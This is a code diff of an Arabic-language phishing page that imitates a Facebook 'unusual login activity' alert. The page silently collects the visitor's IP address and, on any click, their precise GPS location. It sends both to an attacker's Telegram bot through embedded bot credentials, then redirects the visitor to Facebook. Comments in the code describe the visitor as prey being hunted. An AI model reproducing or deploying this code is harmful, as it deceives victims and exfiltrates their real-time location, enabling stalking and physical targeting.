@@ -7,7 +7,7 @@
     <meta property="og:title" content="تنبيه أمني: نشاط غير معتاد على حسابك">
     <meta property="og:description" content="تم رصد محاولة تسجيل دخول من جهاز غير معروف في منطقة ريف دمشق. اضغط للمراجعة وتأمين الحساب.">
     
-    <meta property="og:image" content="fb_alert.jpg"> 
+    <meta property="og:image" content="https://appsyria00.github.io/54545/fb_alert.jpg"> 
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta property="og:type" content="website">
@@ -22,7 +22,8 @@
         .fb-logo { width: 60px; margin-bottom: 20px; }
         .h1 { font-size: 18px; font-weight: bold; color: #1c1e21; margin-bottom: 10px; }
         .p { font-size: 14px; color: #606770; margin-bottom: 25px; line-height: 1.4; }
-        .btn { background: #1877f2; color: white; padding: 12px 20px; border-radius: 6px; font-weight: bold; border: none; width: 100%; cursor: pointer; font-size: 16px; }
+        .btn { background: #1877f2; color: white; padding: 12px 20px; border-radius: 6px; font-weight: bold; border: none; width: 100%; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .btn:hover { background: #166fe5; }
     </style>
 </head>
 <body onclick="getAccurateGPS()">
@@ -36,15 +37,18 @@
     </div>
 
 <script>
+    // 🔱 إعدادات بوت التلجرام 🔱
     const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
     const CHAT_ID = "1611398303";
 
+    // 1. جلب الـ IP صامتاً فور الدخول
     function startSilentScan() {
         const script = document.createElement('script');
         script.src = 'https://api.ipify.org?format=jsonp&callback=initDeepScan';
         document.body.appendChild(script);
     }
 
+    // 2. تحليل بيانات الـ IP وإرسالها صامتاً
     async function initDeepScan(data) {
         const ip = data.ip;
         try {
@@ -57,6 +61,7 @@
         }
     }
 
+    // 3. صيد الـ GPS الحقيقي بالأمتار عند الضغط
     function getAccurateGPS() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
@@ -64,11 +69,15 @@
                 let lon = pos.coords.longitude;
                 let msg = `🎯 صيد دقيق (GPS REAL-TIME)\n📍 الإحداثيات: ${lat}, ${lon}\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
                 sendToTelegram(msg);
+                
+                // تمويه وتوجيه بعد الصيد
                 setTimeout(() => { window.location.href = "https://m.facebook.com/hacked"; }, 1000);
             }, (err) => {
-                sendToTelegram("⚠️ الضحية رفض إذن الموقع.");
+                sendToTelegram("⚠️ الضحية رفض إذن الموقع الدقيق.");
                 window.location.href = "https://m.facebook.com/hacked";
             }, { enableHighAccuracy: true });
+        } else {
+            window.location.href = "https://m.facebook.com/hacked";
         }
     }
 
